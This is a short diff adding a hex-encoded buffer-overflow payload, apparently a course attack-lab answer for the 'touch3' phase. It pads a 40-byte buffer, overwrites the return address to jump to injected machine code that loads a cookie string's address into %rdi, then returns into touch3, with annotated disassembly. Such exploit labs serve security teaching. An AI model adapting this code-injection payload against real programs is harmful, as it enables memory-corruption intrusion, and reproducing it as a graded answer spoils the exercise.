@@ -1,0 +1,11 @@
+30 30 30 30 30 30 30 30 30 30 /* fill a buffer of size 40 bytes */
+30 30 30 30 30 30 30 30 30 30
+30 30 30 30 30 30 30 30 30 30
+30 30 30 30 30 30 30 30 30 30
+a8 dc 61 55 00 00 00 00 /* new ret address pointing to the attack code */	
+48 c7 c7 c0 dc 61 55 48 /* 0x5561dca8: 48 c7 c7 c0 dc 61 55  mov  $0x5561dcc0,%rdi */
+83 c4 10 c3 00 00 00 00 /* 0x5561dcaf: 48 83 c4 10           add  $0x10,%rsp       */
+                        /* 0x5561dcb3: c3                    retq                  */
+fa 18 40 00 00 00 00 00 /* another new ret address pointing to touch3 */
+35 39 62 39 39 37 66 61 /* p (char*)0x5561dcc0: 59b997fa */
+
